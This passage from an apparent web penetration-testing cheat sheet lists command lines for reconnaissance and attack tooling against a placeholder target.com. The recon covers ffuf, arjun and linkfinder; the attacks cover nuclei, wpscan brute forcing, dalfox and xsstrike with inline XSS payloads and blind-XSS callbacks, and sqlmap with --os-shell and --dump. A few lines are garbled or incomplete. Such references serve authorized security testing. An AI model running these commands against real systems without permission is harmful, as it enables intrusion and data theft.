    # ======================
    # RECOMMENDED WORDLISTS
    # ======================
    # Common: raft-medium-directories.txt
    # Large: raft-large-directories.txt
    # API: burp-parameter-names.txt
    # Backups: backup-filenames.txt
    # Sensitive: sensitive-api-paths.txt
    # Extensions: common-extensions.txt

    # ======================
    # RESPONSE CODE STRATEGIES
    # ======================
    # 200: Valid content
    # 301/302: Redirects worth following
    # 403: Forbidden (potential interest)
    # 401: Authentication required
    # 500: Server errors (potential info leaks)

#### 2.2.2 Backup & Temporary File Fuzzing
    # 1. COMPREHENSIVE BACKUP SCAN (All common extensions)
    ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
    -u https://target.com/FUZZ \
    -e .bak,.old,.zip,.tar.gz,.sql,.conf,.config,.swp,~,.backup,.bkp,.save,.orig,.copy \
    -t 150 \
    -mc 200,403 \
    -o ffuf_backup_scan.json \
    -of json

    # 2. TARGETED FILENAME SCAN (Common sensitive files)
    ffuf -w /usr/share/seclists/Discovery/Web-Content/Common-DB-Backups.txt \
    -u https://target.com/FUZZ \
    -e .bak,.old,.sql \
    -t 100 \
    -mc 200 \
    -o ffuf_sensitive_backups.json

    # 3. USER DIRECTORY CHECK (Tilde convention)
    ffuf -w /usr/share/seclists/Discovery/Web-Content/User-Directories.txt \
    -u https://target.com/~FUZZ \
    -t 50 \
    -mc 200,403 \
    -o ffuf_user_dirs.json

    # 4. VERSION CONTROL FILES
    ffuf -w /usr/share/seclists/Discovery/Web-Content/VersionControlFiles.txt \
    -u https://target.com/FUZZ \
    -t 100 \
    -mc 200,403 \
    -o ffuf_vcs_files.json

    # 5. ENVIRONMENT FILES
    ffuf -w /usr/share/seclists/Discovery/Web-Content/Common-Environment-Files.txt \
    -u https://target.com/FUZZ \
    -t 100 \
    -mc 200,403 \
    -o ffuf_env_files.json

    # ======================
    # ADVANCED TECHNIQUES
    # ======================

    # 1. TIMESTAMPED BACKUPS
    # Find backups with date patterns
    for pattern in {2020..2023}{01..12}{01..31}; do
    curl -s -o /dev/null -w "%{http_code} " "https://target.com/db_backup_$pattern.sql"
    done | grep -v "404" > dated_backups.txt

    # 2. INCREMENTAL BACKUPS
    # Check for numbered backups
    seq 1 10 | xargs -I{} curl -s -o /dev/null -w "%{http_code} backup_{}.zip\n" "https://target.com/backup_{}.zip" \
    | grep -v "404"

    # 3. CASE VARIATIONS
    # Check case-sensitive backups
    cat common_files.txt | while read file; do
    for ext in .BAK .OLD .Backup; do
        curl -s -o /dev/null -w "%{http_code} $file$ext\n" "https://target.com/$file$ext" | grep -v "404"
    done
    done

    # ======================
    # PRO TIPS:
    # 1. Always check both with and without extensions
    # 2. Try prepending/appending version numbers (v1, _old)
    # 3. Check for compressed versions (.gz, .zip, .tar)
    # 4. Look for developer naming patterns (final, test, temp)
    # 5. Combine with waybackurls for historical backups
    # ======================

    # RECOMMENDED WORDLISTS:
    # - /usr/share/seclists/Discovery/Web-Content/Common-DB-Backups.txt
    # - /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
    # - /usr/share/seclists/Discovery/Web-Content/VersionControlFiles.txt
    # - Custom lists with target-specific naming conventions

    # EXAMPLE WORKFLOW:
    # 1. Run comprehensive backup scan
    # 2. Check for version control files
    # 3. Search for environment/config files
    # 4. Verify found backups manually
    # 5. Check historical data (Wayback Machine)
#### 2.2.3 Configuration File Discovery
    :- Looking for common config files like .env, web.config, .htaccess, server-status, etc.
    
    ffuf -w config_files.txt -u https://target.com/FUZZ -mc 200 -o ffuf_configs.txt 
    :- Fuzz common config file names/paths

    ffuf -w config_exts.txt -u https://target.com/config.FUZZ -mc 200 -o ffuf_config_exts.txt 
    :- Fuzz extensions for common config base names

    ffuf -w apache_files.txt -u https://target.com/FUZZ -H "Host: localhost" -mc 200 
    :- Check common Apache config/status files (e.g., /server-status, /server-info)
    
    nuclei -u https://target.com -t exposures/files/sensitive-files.yaml -o nuclei_sensitive_files.txt 
    :- Use Nuclei templates for sensitive file exposure

#### 2.2.4 Favicon Hashing for Tech/Asset Identification
    :- Identifies sites/technologies by hashing the /favicon.ico file and comparing against known hashes
    
    :- 1. Get the favicon hash:

    python3 -c 'import mmh3; import requests; r = requests.get("https://target.com/favicon.ico", verify=False); print(mmh3.hash(r.content))'
    
    favfreak.py -i list_of_hosts.txt -o favicon_matches.json             
    :- Tool to automate favicon hashing and lookup (conceptual)
    
    nuclei -l live_urls.txt -t technologies/favicon-detection-template.yaml -o nuclei_favicon_tech.txt 
    :- Nuclei template for favicon tech detection (if available)
    
    Search hash on Shodan: http.favicon.hash:<hash_value>               
    :- Use Shodan to find other sites with the same favicon

#### 2.2.5 Source Code/VCS Exposure Discovery
    :- Finding exposed .git, .svn, .DS_Store files etc.
    
    git-dumper https://target.com/.git/ ./target_git_dump              
    :- Dump exposed .git repositories

    svn-extractor http://target.com/.svn/ ./target_svn_dump             
    :- Dump exposed .svn repositories

    dotds_finder -u https://target.com -o ds_store_files.txt            
    :- Find exposed .DS_Store files

    ffuf -w vcs_paths.txt -u https://target.com/FUZZ -mc 200,403 -o ffuf_vcs_check.txt 
    :- Fuzz common VCS paths (.git/HEAD, .svn/entries, etc.)
    
    nuclei -u https://target.com -t exposures/exposed-panels/            
    :- Nuclei templates often include checks for exposed VCS/source code


### 2.3 Parameter Discovery
    :- Smart parameter brute forcer for a single endpoint
    arjun -u https://target.com/api/endpoint -o arjun_params.json
    
    :- Find GET parameters
    arjun -u https://target.com/api/endpoint -m GET -o arjun_get_params.json
    
    :- Find POST parameters
    arjun -u https://target.com/api/endpoint -m POST -o arjun_post_params.json
    
    :- Find JSON parameters
    arjun -u https://target.com/api/endpoint -m JSON -o arjun_json_params.json
    
    :- Find hidden params in a list of URLs
    arjun -i urls_with_params.txt -o arjun_from_list.json
    
    :- Use custom wordlist
    arjun -u https://target.com -w custom_params.txt -o arjun_custom_wordlist.txt 

    
    :- Mine parameters from archives (high level of uncommon params)
    paramspider -d target.com -l high -o paramspider_high.txt
    
    :- Mine parameters (low level - common params)
    paramspider -d target.com -l low -o paramspider_low.txt
    
    :- Exclude certain file extensions
    paramspider -d target.com --exclude jpg,png,css -o paramspider_filtered.txt 
    
    :- Include subdomains
    paramspider -d target.com -s -o paramspider_with_subs.txt
    
    :- Use custom parameter wordlist
    paramspider -d target.com -p custom_wordlist.txt -o paramspider_custom.txt


#### 2.3.1 Hidden Input Field Discovery
    :- Finding form fields marked as type="hidden" which might contain sensitive info or be tamperable
 
    katana -u https://target.com -f hidden -o katana_hidden_inputs.txt  
    :- Use Katana's field config to extract hidden inputs
 
    gospider -s https://target.com --other-source --include-subs -o gospider_all_urls.txt
 
    cat gospider_all_urls.txt | httpx -silent | grep -rio '<input[^>]*type=[\" \']hidden[\" \']' 
    :- Grep crawled pages for hidden inputs

### 2.4 JavaScript Analysis
    :- Extract endpoints from a single JS file
    linkfinder -i https://target.com/main.js -o linkfinder_endpoints.txt
    
    :- Discover and analyze JS files from a domain
    linkfinder -i https://target.com/ -d -o linkfinder_discovered_js.txt
    
    :- Regex for specific paths
    linkfinder -i 'https://target.com/*.js' -r '^/api/v[1-3]' -o linkfinder_api_regex.txt 
    
    :- Analyze a list of JS files
    linkfinder -i js_files_list.txt -o linkfinder_from_list.txt

    
    :- Find API keys/tokens in JS file
    secretfinder -i script.js -o secrets_found.json
    
    :- Scan all JS files in a folder
    secretfinder -i /path/to/js_folder/ -o secrets_from_folder.json
    
    :- Use custom regex patterns
    secretfinder -i script.js -g "AWS_ACCESS_KEY|GOOGLE_API_KEY" -o secrets_custom_regex.json 

    
    :- Download all JS files from a URL
    getjs --url https://target.com --output js_files_output/
    
    :- Download JS from a list of URLs
    getjs --list list_of_urls.txt --threads 5 --output js_batch_dl/
    
    :- Verbose output
    getjs --url https://target.com --verbose --output js_verbose_dl/

    
    :- Find JavaScript files on live subdomains of target.com
    subjs -u https://target.com -o subjs_live_urls.txt
    
    :- Find JS on a list of domains
    subjs -i list_of_domains.txt -o subjs_from_list.txt
    
    :- Custom concurrency, timeout, protocol
    subjs -c 10 -t 5 -p https -o subjs_custom_settings.txt

    
    :- Scan JS for vulnerable libraries
    retire -j -p /path/to/js_code/ --outputformat json --outputfile retire_report.json 
    
    :- Scan a list of JS files
    retire -n --jsrepo my_js_files.txt --outputpath retire_output.txt
    ------
        linkfinder -i https://target.com/main.js -o endpoints.txt
    jsanalyze.py -u https://target.com/script.js -o js_results.txt
    secretfinder -i script.js -o secrets.json
    getjs --url https://target.com -o js_files/
    subjs -u https://target.com -o javascript_urls.txt
    ------
    linkfinder -i https://target.com/main.js -o endpoints_mainjs.txt -d
    linkfinder -i $(cat urls.txt | grep ".js$") -o all_js_endpoints.txt -r
    jsanalyze.py -u https://target.com/script.js -o js_results_script.txt -c cookies.txt
    jsanalyze.py -u $(cat subfinder.txt | grep ".js") -o all_js_analysis.txt -H "Authorization: Bearer token"
    secretfinder -i script.js -o secrets_script.json -r high
    secretfinder -i $(cat js_files/*.js) -o all_secrets.json -n
    getjs --url https://target.com -o js_files/ -d 3
    getjs --url $(cat subfinder.txt) -o all_sub_js/ -t 20
    subjs -u https://target.com -o javascript_urls_target.txt -v
    subjs -u $(cat urls.txt) -o all_javascript_urls.txt -c 50
    ------
    linkfinder -i https://target.com/main.js -o endpoints_mainjs_deep.txt -d -w common_words.txt
    linkfinder -i $(cat urls.txt | grep ".js$") -o all_js_endpoints_full.txt -r -c cookies.txt -H "Authorization: Bearer token"
    jsanalyze.py -u https://target.com/script.js -o js_results_script_full.txt -c cookies.txt -p all
    jsanalyze.py -u $(cat subfinder.txt | grep ".js") -o all_js_analysis_verbose.txt -H "X-API-Key: secret" -v
    secretfinder -i script.js -o secrets_script_verbose.json -r all -a
    secretfinder -i $(cat js_files/*.js) -o all_secrets_detailed.json -n -e entropy
    getjs --url https://target.com -o js_files/ -d 5 -t 30
    getjs --url $(cat subfinder.txt) -o all_sub_js_verbose/ -t 30 -v --user-agent "Chrome/100.0.0.0"
    subjs -u https://target.com -o javascript_urls_target_full.txt -v -a
    subjs -u $(cat urls.txt) -o all_javascript_urls_deep.txt -c 75 -oA


#### 2.4.1 Find JS files, then extract secrets


### 2.5 Screenshotting and Visual Recon
    :- Screenshot a list of URLs
    gowitness file -f live_urls.txt -P screenshots/
    
    :- Screenshot from Nmap XML
    gowitness nmap -f nmap_scan.xml -P nmap_screenshots/
    
    :- Screenshot a single URL
    gowitness single https://target.com/admin -o admin_panel.png
    
    :- Custom delay and resolution
    gowitness file -f urls.txt --delay 5 --resolution "1280x1024" -P screenshots_custom/ 

    
    :- Screenshot and basic port scan on subdomains
    aquatone -ports large < live_subdomains.txt
    
    :- Larger scan
    aquatone -scan-timeout 1000 -ports xlarge -threads 25 < domains.txt -out aqua_report/ 

    
    :- Take screenshots with httpx and store in directory
    httpx -l urls.txt -ss -srd screenshots_httpx/ -silent
    
    :- Capture first 5000 bytes of screenshot
    httpx -l urls.txt -screenshot-bytes 5000 -srd screenshots_small/



### 2.6 Link Extraction & Analysis Tools
    :- Re-iterated for focus on link finding
    linkfinder -i 'https://target.com/*.js' -o js_links.txt             
    
    getlinks.py https://target.com > page_links.txt                     
    :- Conceptual tool to extract all href/src links from a page


### 2.7 HTTP Analysis


#### 2.7.1 HTTP Method Testing
    :- Identifying allowed methods like PUT, DELETE, OPTIONS, etc.
    
    curl -X OPTIONS https://target.com/api/resource -i                  
    :- Check allowed methods using OPTIONS

    httpx -l live_urls.txt -silent -methods -o allowed_methods.txt      
    :- Use httpx to probe allowed methods for a list of URLs
    
    :- Use ffuf/wfuzz to test arbitrary methods:

    ffuf -w methods.txt:METHOD -u https://target.com/resource -X METHOD --hc 404 
    :- Fuzz methods from a list
    
    nuclei -u https://target.com -t exposures/http-verb-tampering.yaml 
    :- Use Nuclei templates for method tampering/testing


#### 2.7.2 Response Header Analysis
    :- Inspecting headers for security configurations, technology info, and potential leaks
    
    curl -I https://target.com                                          
    :- Fetch headers only using HEAD request
 
    curl -s -D - https://target.com -o /dev/null                        
    :- Fetch headers using GET request, discard body
 
    httpx -l live_urls.txt -silent -H "User-Agent: MyScanner" -csp -hsts -security-headers -server -tech -o header_analysis.txt 
    :- httpx for security headers, server info etc.

    :- Server: Apache/2.4.41 (Ubuntu) -> Technology disclosure

    :- X-Powered-By: PHP/7.4.3 -> Technology disclosure

    :- Content-Security-Policy: ... -> Check for weak CSP

    :- Strict-Transport-Security: ... -> Check HSTS settings

    :- Access-Control-Allow-Origin: * -> Potential CORS misconfiguration

    :- Set-Cookie: ... -> Analyze cookie flags (HttpOnly, Secure, SameSite)

    :- X-Frame-Options: ... -> Clickjacking protection

    :- X-AspNet-Version: ... -> ASP.NET version disclosure


#### 2.7.3 Status Code & Content Analysis
    :- Analyzing non-200/404 codes and content properties for clues
    
    ffuf -w wordlist.txt -u https://target.com/FUZZ --sc 200,301,302,401,403,500 -o ffuf_interesting_codes.txt 
    :- Fuzz and record multiple interesting status codes

    httpx -l live_urls.txt -silent -status-code -content-length -o status_length.txt 
    :- Record status code and content length


#### 2.7.4 Content Similarity Analysis
    :- Requires tools that can calculate perceptual hashes or similarity scores

    pip install ssdeep tlsh
    
    :- Conceptual Workflow:
    :- 1. Get response body for a known non-existent page: curl https://target.com/nonexistent_page > baseline_404.html
    :- 2. Calculate hash: ssdeep baseline_404.html > baseline_hash.txt
    :- 3. During fuzzing, hash responses and compare:
    
    ffuf -w wordlist.txt -u https://target.com/FUZZ -of json -o ffuf_results.json
    python process_ffuf_output.py ffuf_results.json baseline_hash.txt 
    :- Custom script to hash results and compare


#### 2.7.5 Error Message Extraction & Analysis
    :- Looking for stack traces, database errors, file paths in error messages
    
    :- Combine crawling/fuzzing with grep:

    katana -u https://target.com -d 3 -o crawl.txt && cat crawl.txt | httpx -silent -status-code 500 -o error_pages.txt

    cat error_pages.txt | xargs -I{} curl -s {} | grep -E 'Exception|Error|Warning|Traceback|SQLSTATE| ORA-|path|Microsoft OLE DB|at line' > errors_found.txt
    
    nuclei -l live_urls.txt -t exposures/stacktrace-disclosure.yaml -o nuclei_stacktraces.txt 
    :- Use Nuclei templates for error detection

### 2.8 Form Discovery
    :- Specifically identifying HTML forms for further testing - CSRF, XSS, SQLi etc.
    
    katana -u https://target.com -f form -o katana_forms.txt            
    :- Use Katana's field config to extract forms
    
    :- Use general crawlers (Katana, GoSpider, Hakrawler) and grep output for `<form` tags

    grep -rio "<form" ./crawl_output/                                 
    :- Grep crawl results for form tags


### 2.9 Virtual Host (VHOST) Fuzzing
    :- Fuzzing (Used to find different web applications hosted on the same IP, differentiated by Host header)
    
    :- Fuzz Host header
    ffuf -w vhost_wordlist.txt -u http://TARGET_IP -H "Host: FUZZ.target.com" -fs <baseline_size> -o ffuf_vhost.txt 
    
    :- Match 200, filter 404/400
    ffuf -w vhost_wordlist.txt -u https://TARGET_IP -H "Host: FUZZ.target.com" --mc 200 --fc 404,400 -o ffuf_vhost_https.txt 
    
    :- Gobuster for VHOST fuzzing
    gobuster vhost -u http://target.com -w subdomains_for_vhost.txt -t 50 -o gobuster_vhost.txt 
    
    :- Append target domain to wordlist entries
    gobuster vhost -u https://target.com -w wordlist.txt --append-domain -o gobuster_vhost_append.txt 


### 2.10 HTTP Header Fuzzing
     :- (Used to test for cache poisoning, header injection vulnerabilities, finding hidden headers)
     
     :- Fuzz X-Forwarded-Host
     -w header_payloads.txt -u https://target.com -H "X-Forwarded-Host: FUZZ" -fs <baseline_size> 
    
    :- Fuzz header names
    ffuf -w common_headers.txt:HEADER -u https://target.com -H "HEADER: testvalue" --mc 200,302 
    
    :- Fuzz HTTP methods
    ffuf -w methods.txt:METHOD -u https://target.com -X METHOD --hc 405,404 


### 2.11 HTTP Parameter Pollution (HPP)
    :- (Testing how the server handles multiple parameters with the same name)
    Manual Testing: Add duplicate parameters in GET/POST requests, e.g.:
    https://target.com/search?q=test1&q=test2
    POST / form data: param=val1&param=val2
    
    :- Use Nuclei templates for HPP
    nuclei -u https://target.com/search?q=test -t exposures/parameter-pollution.yaml 
    -------
    arjun -u https://target.com/api -o params.json
    arjun -u https://target.com/endpoint
    paramspider -d target.com -l high -o paramspider.txt
    paramspider -d target.com
    waybackparam -u target.com
    waybackparam -u target.com -o wayback_params.txt
    parameth -u https://target.com -f wordlist.txt
    qsreplace -a urls.txt
    qsreplace -a urls.txt -p common_params.txt -o all_params.txt
    ------
    arjun -u https://target.com/api -o params_api.json -m all
    arjun -u https://target.com/index.php?id=FUZZ -p /usr/share/seclists/Fuzzing/param-names/default.txt -o arjun_get.txt
    paramspider -d target.com -l all -o paramspider_all.txt -s
    waybackparam -u target.com -o wayback_params_all.txt -dedupe
    parameth -u https://target.com -f /usr/share/seclists/Fuzzing/param-names/special.txt -b "404,403" -t 20
    qsreplace -a urls.txt -p /usr/share/seclists/Fuzzing/GET-params-2021.txt -o all_params_get.txt
    qsreplace -a urls.txt -p /usr/share/seclists/Fuzzing/POST-params.txt -m POST -o all_params_post.txt
    ------
    arjun -u https://target.com/api -o params_api_full.json -m all -t 30
    arjun -u https://target.com/index.php?id=FUZZ&lang=en -p /usr/share/seclists/Fuzzing/param-names/all.txt -o arjun_get_all.txt
    paramspider -d target.com -l insane -o paramspider_insane.txt -s -w /usr/share/seclists/Fuzzing/predictable-parameters.txt
    waybackparam -u target.com -o wayback_params_full.txt -dedupe -filter "password|token|secret"
    parameth -u https://target.com -f /usr/share/seclists/Fuzzing/param-names/extended.txt -b "404,403,302" -t 25
    qsreplace -a urls.txt -p /usr/share/seclists/Fuzzing/GET-params-2021.txt -o all_params_get_long.txt -threads 30
    qsreplace -a urls.txt -p /usr/share/seclists/Fuzzing/POST-params.txt -m POST -o all_params_post_long.txt -threads 30


## 3. VULNERABILITY SCANNING & INITIAL EXPLOITATION


### 3.1 Automated Scanning
    nuclei -u https://target.com -t nuclei-templates/
    nuclei -l urls.txt -t nuclei-templates/ -severity critical,high -o nuclei.txt
    nuclei -l urls.txt -t nuclei-templates/ -me results/
    nikto -h https://target.com -output nikto.xml -Format xml
    zap -cmd -quickurl https://target.com -quickout report.html
    wpscan --url https://target.com --enumerate vp,vt,tt,cb,dbe
    cent -u target.com -s high,critical
    ------
    nuclei -u https://target.com -t nuclei-templates/http/ -severity critical,high,medium -o nuclei_http.txt -rate-limit 100 -bulk-size 50
    nuclei -l subfinder.txt -t nuclei-templates/dns/ -o nuclei_dns.txt -exclude-severity low,info
    nikto -h https://target.com -output nikto_full.xml -Format xml -C all -Tuning x,c,i,a,s,b,e
    nikto -h https://target.com -output nikto_ssl.txt -Format txt -ssl -port 443
    zap -cmd -quickurl https://target.com -quickout report_zap.html -config zap_config.ini
    zap -cmd -quickurl https://target.com -quickprogress -apikey $ZAP_API_KEY
    testssl.sh -e -E -f -U -S -P -Q --ip $(dig +short target.com | head -n 1) target.com
    testssl.sh --vulnerabilities target.com
    wpscan --url https://target.com --enumerate p,u,t,m,c --api-token $WP_SCAN_TOKEN -o wpscan_full.txt
    wpscan --url https://target.com/blog --plugins-version --themes-version
    ------
    nuclei -u https://target.com -t nuclei-templates/http/,custom-templates/ -severity critical,high,medium,low -o nuclei_all.txt -rate-limit 150 -bulk-size 75 -retries 5
    nuclei -l subfinder.txt -t nuclei-templates/dns/,third-party-templates/ -o nuclei_all_dns.txt -exclude-severity info -concurrency 100
    nikto -h https://target.com -output nikto_very_full.xml -Format xml -C all -Tuning x,c,i,a,s,b,e,1,2,3,4,5,6,7 -evasion 1,2,3,4 -useragent "Custom-Scanner/1.0"
    nikto -h https://target.com -output nikto_ssl_extended.txt -Format txt -ssl -port 443 -mutate 1,2,3
    zap -cmd -quickurl https://target.com -quickout report_zap_full.html -config zap_advanced_config.ini -ajaxspider
    zap -cmd -quickurl https://target.com -quickprogress -apikey $ZAP_API_KEY -recursive -maxchildren 10
    testssl.sh -e -E -f -U -S -P -Q --ip $(dig +short target.com | head -n 1) target.com --file vulns.txt --openssl /usr/bin/openssl1.1
    testssl.sh --all target.com
    wpscan --url https://target.com --enumerate p,u,t,m,c,dbe,ap --api-token $WP_SCAN_TOKEN -o wpscan_very_full.txt --plugins-detection aggressive --themes-detection aggressive
    wpscan --url https://target.com/blog --plugins-version --themes-version --verbose

#### 3.1.1 Automated Vulnerability Scanning
    :- Fast template-based scanner
    nuclei -u https://target.com -t nuclei-templates/ -severity critical,high -o nuclei_report.txt 
    
    :- Scan list for CVEs/Exposures, exclude tags
    nuclei -list list_of_urls.txt -t cves/,exposures/ -etags "xss,sqli" -o nuclei_cve_exposure.txt 
    
    :- Scan with custom header
    nuclei -u https://target.com -t nuclei-templates/ -H "Cookie: session=123" -o nuclei_auth.txt 
    
    :- Automatic template selection based on tech
    nuclei -u https://target.com -t technologies/ -as -o nuclei_tech_auto.txt
    
    :- Specific template category
    nuclei -u https://target.com -t exposures/misconfigurations/ -o nuclei_misconfigs.txt 
    
    :- Filter templates by tags (WordPress, Joomla)
    nuclei -u https://target.com -tags "wp,joomla" -o nuclei_cms.txt
    
    :- Validate templates before running
    nuclei -u https://target.com -validate -o nuclei_validate.txt
    
    :- Update nuclei templates
    nuclei -update-templates
    
    :- Rate limit requests and concurrency
    nuclei -u https://target.com -rl 10 -c 5 -o nuclei_rate_limit.txt

    
    :- Classic web server scanner, XML output
    nikto -h https://target.com -output nikto_report.xml -Format xml
    
    :- Specific tuning options (e.g., file upload, interesting files, misconfigs)
    nikto -h https://target.com -Tuning 123b -o nikto_tuning.txt
    
    :- Auto-enable interesting plugins
    nikto -h https://target.com -ask auto -o nikto_auto_plugins.txt
    
    :- Run specific plugins
    nikto -h https://target.com -Plugins "apacheusers;cgi" -o nikto_specific_plugins.txt 
    
    :- Scan through a proxy
    nikto -h https://target.com -useproxy http://localhost:8080 -o nikto_proxy.txt 

    
    :- Web vulnerability scanner, HTML report
    wapiti -u https://target.com -f html -o wapiti_report.html
    
    :- Specify modules to run/skip
    wapiti -u https://target.com -m "-all,+xss,+sqli,-csrf" -o wapiti_modules.txt 
    
    :- Limit scope to domain
    wapiti -u https://target.com --scope domain -o wapiti_scope_domain.txt


#### 3.1.2 SSL/TLS Configuration Checks
    :- Comprehensive SSL/TLS checks
    testssl.sh https://target.com
    
    :- Quiet mode, HTML output
    testssl.sh --quiet --htmlfile report.html https://target.com
    
    :- Run all checks (each flag is a check group)
    testssl.sh -e -E -f -U -S -P -Q https://target.com
    
    :- Check supported protocols
    testssl.sh --protocols https://target.com
    
    :- Check ciphers per protocol
    testssl.sh --cipher-per-proto https://target.com
    
    :- Show details for each cipher
    testssl.sh --show-each-cipher https://target.com
    
    :- SSLyze for SSL/TLS scanning
    sslyze --regular target.com:443


#### 3.1.3 CMS Specific Scanning
    :- WordPress: Enumerate vulnerable plugins/themes, users etc.
    wpscan --url https://wordpress-site.com --enumerate vp,vt,tt,cb,dbe -o wpscan_enum.txt 
    
    :- With API token
    wpscan --url https://wp.com --api-token YOUR_WPSCAN_API_TOKEN --random-user-agent -o wpscan_api.txt 
    
    :- Enumerate users, aggressive plugin detection
    wpscan --url https://wp.com -e u --plugins-detection aggressive -o wpscan_aggressive.txt 
    
    :- Brute force login
    wpscan --url https://wp.com --passwords rockyou.txt --usernames admin,editor -o wpscan_brute.txt 

    
    :- Joomla vulnerability scanner, enumerate components
    joomscan --url https://joomla-site.com -ec -o joomscan_report.txt
    
    :- Drupal scanner, enumerate all, 20 threads
    droopescan scan drupal -u https://drupal-site.com -e a -t 20 -o droopescan_report.txt 


### 3.2 XSS Testing
    :- Automated XSS with blind payload
    dalfox url 'https://target.com/search?q=FUZZ' -b your.burpcollaborator.net -o dalfox_basic.txt 
    
    :- Scan URLs from file, skip basic auth vuln
    dalfox file list_of_urls_with_params.txt --skip-bav -o dalfox_from_file.txt 
    
    :- Test POST request
    dalfox url 'https://target.com/page' --data 'param1=test&param2=FUZZ' -X POST -o dalfox_post.txt 
    
    :- Use custom payloads
    dalfox url 'https://target.com/reflect' --custom-payload xss_payloads.txt -o dalfox_custom.txt 
    
    :- DOM XSS mining
    dalfox url 'https://target.com' --mining-dom --deep-domxss -o dalfox_dom.txt 
    
    :- Attempt WAF evasion techniques
    dalfox url 'https://target.com' --waf-evasion -o dalfox_waf.txt

    
    :- Crawl and test, provide seeds
    xsstrike -u "https://target.com/search?q=test" --crawl -t 10 -l 3 --seeds seeds.txt -o xsstrike_crawl.html 
    
    :- Custom payloads and headers
    xsstrike -u "https://target.com/input?val=1" -f /path/to/payloads.txt --headers "Cookie: SESSID=123" 
    
    :- Test JSON input in POST body, path discovery
    xsstrike -u "https://target.com/api" --json --path -d '{"key":"FUZZ"}' -o xsstrike_json.html 

    
    :- Simple Reflected XSS scanner
    kxss 'https://target.com/index.php?p=FUZZ'
    
    :- Pipe URL and set custom parameters like cookies
    echo 'https://target.com/q=FUZZ' | kxss -p 'Cookie: test=kXSS'
    ----
        dalfox url 'https://target.com/search?q=test'
    dalfox url 'https://target.com/search?q=test' -b https://xss.burpcollab.net
    xsstrike -u "https://target.com/search?q=1"
    xsstrike -u "https://target.com/search?q=1" --crawl -t 10
    xsser -u "https://target.com" -g "/search.php?q=XSS" -c 3
    kxsstester -u https://target.com/search?q=1
    kxsstester -u https://target.com/search?q=1 --dom --post-data 'param=val'
    brutexss -u https://target.com -p "param1 param2" -w xss_payloads.txt
    ------
    dalfox url 'https://target.com/search?q=test' -b https://xss.burpcollab.net -w /usr/share/seclists/Fuzzing/XSS/XSS-Payloads-L5.txt -p 10
    dalfox url 'https://target.com/submit' -p 'param1=value1&param2=<script>alert(1)</script>' -X POST -b https://xss.burpcollab.net
    xsstrike -u "https://target.com/search?q=1" --crawl -t 20 --fuzzer all --level 3 -o xsstrike_crawl.txt
    xsstrike -u "https://target.com/profile?id=1" --params "id" -p XSS/XSS-Payloads.txt
    xsser -u "https://target.com" -g "/search.php?q=XSS" -c 5 --payloads XSS/XSS-Payloads.txt
    xsser -u "https://target.com/form.html" --post="name=test&email=<script>alert(1)</script>"
    kxsstester -u https://target.com/search?q=1 --dom --post-data 'param=val' --payloads XSS/DOMXSS.txt
    kxsstester -u https://target.com/vuln#test=<script>alert(1)</script> --hash
    brutexss -u https://target.com -p "name query search" -w XSS/XSS-Payloads.txt -t 30
    brutexss -u https://target.com -data "param1=value1&param2=FUZZ" -w XSS/XSS-Payloads.txt -m POST
    ------
    dalfox url 'https://target.com/search?q=test' -b https://xss.burpcollab.net -w XSS/XSS-Payloads-Full.txt -p 15 -smart
    dalfox url 'https://target.com/submit' -p 'param1=value1&param2=<img src=x onerror=alert(1)>' -X POST -b https://xss.burpcollab.net -blind-timeout 30
    xsstrike -u "https://target.com/search?q=1" --crawl -t 25 --fuzzer all --level 5 -o xsstrike_crawl_full.txt --vectors all
    xsstrike -u "https://target.com/profile?id=1" --params "id" -p XSS/XSS-Polyglots.txt --encode
    xsser -u "https://target.com" -g "/search.php?q=XSS" -c 7 --payloads XSS/XSS-Payloads-Advanced.txt --delay 2
    xsser -u "https://target.com/form.html" --post="name=test&email=<svg><script>alert(1)</script></svg>" --headers "Content-Type: application/xml"
    kxsstester -u https://target.com/search?q=1 --dom --post-data 'param=val' --payloads XSS/DOMXSS.txt --proxy http://127.0.0.1:8080
    kxsstester -u https://target.com/vuln#test=<img src=x onerror=prompt(1)> --hash --user-agent "Mozilla/5.0"
    brutexss -u https://target.com -p "name query search input" -w XSS/XSS-Payloads-L5.txt -t 35 -headers "X-Forwarded-For: 127.0.0.1"
    brutexss -u https://target.com -data "param1=value1&param2=FUZZ" -w XSS/XSS-Event-Attributes.txt -m POST -cookies "sessionid=..."

### 3.3 SQL Injection Testing
    :- Automated SQLi, enumerate databases
    sqlmap -u "https://target.com/product?id=1" --batch --level 3 --risk 2 --dbs 
    
    :- Test POST request, 5 threads
    sqlmap -u "https://target.com/search.php" --data="query=keyword" --dbs --threads 5 
    
    :- Specify parameter, use tamper script, get current user
    sqlmap -u "https://target.com/user?id=1" -p id --tamper=space2comment --random-agent --current-user 
    
    :- Load request from file, attempt OS shell
    sqlmap -l request.txt --level 5 --risk 3 --os-shell
    
    :- Specify DBMS, get banner
    sqlmap -u "https://target.com/vuln.php?id=1&cat=2" --dbms=MySQL --banner
    
    :- Test forms found by crawling
    sqlmap -u "https://target.com/login" --forms --crawl=2 --batch

    :- Load raw HTTP request, specify parameter, use specific techniques (boolean, error, union, stacked, time-based, inline), 

    :-ump data
    sqlmap -r post_request.txt -p username --technique=BEUSQ --dump
    
    :- Manual injection point with eval for dynamic payloads
    sqlmap -u "https://api.target.com/items?filter=FUZZ" --eval="import time; time.sleep(0.1)" --prefix="'" --suffix="-- -" 

    
    :- Modern SQLi scanner, list DBs
    ghauri -u "https://target.com/search.php?q=test" --dbs
    
    :- Scan from request file, specify parameter
    ghauri -r request_file.txt -p vulnerable_param --level 3 --risk 2
    ----
        sqlmap -u "https://target.com?id=1" --batch
    sqlmap -u "https://target.com?id=1" --batch --level 5 --risk 3 --dbs
    sqlmap -r request.txt --dbs
    nosqli scan -u https://target.com/api?id=1
    nosqlmap -u https://target.com/api?query=admin
    ghauri --url https://target.com/search.php?q=1 --dbs
    jsql -u https://target.com/vuln.jsp?id=1
    sqli-detector -u https://target.com/login
    ------
    sqlmap -u "https://target.com?id=1" --batch --level 5 --risk 3 --dbs --threads 10
    sqlmap -u "https://target.com/news.php?id=1" --dbs --tamper="apostrophemask,apostrophenullencode,charencode"
    nosqlmap -u https://target.com/api?query=admin --mongo-shell --os-shell
    nosqlmap -u https://target.com/users --get --value "'or 1=1--"
    ghauri --url https://target.com/search.php?q=1 --dbs --threads 5
    ghauri --url https://target.com/item?name=test' --identify
    jsql -u https://target.com/vuln.jsp?id=1 --test="AND SLEEP(5)"
